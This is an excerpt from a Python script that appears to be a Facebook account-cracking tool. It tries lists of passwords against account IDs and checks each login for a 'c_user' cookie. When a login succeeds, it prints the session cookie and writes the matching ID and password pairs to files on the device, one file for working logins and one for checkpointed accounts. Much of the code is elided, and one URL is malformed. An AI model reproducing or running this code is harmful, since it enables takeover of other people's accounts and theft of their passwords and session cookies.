...
def o():
    ...
    if opt == '2':
        ...
        os.system('xdg-open https://www.facebook.com/XAIKO.SHIMANTO.326')
    ...
    if opt == '4':
        ...
        os.system('xdg-open https://https://www.facebook.com/profile.php?id=100006377316183')
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('    \033[1;32m[SHIMANTO-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')

                cek_apk(session,coki)

                open('/sdcard/SHIMANTO-OK.txt', 'a').write( cid+' | '+ps+'\n')
                ...
                print('    \33[1;30m[SHIMANTO-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')

                open('/sdcard/SHIMANTO-CP.txt', 'a').write( cid+' | '+ps+' \n')
        ...
        sys.stdout.write(' %s[SHIMANTO] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
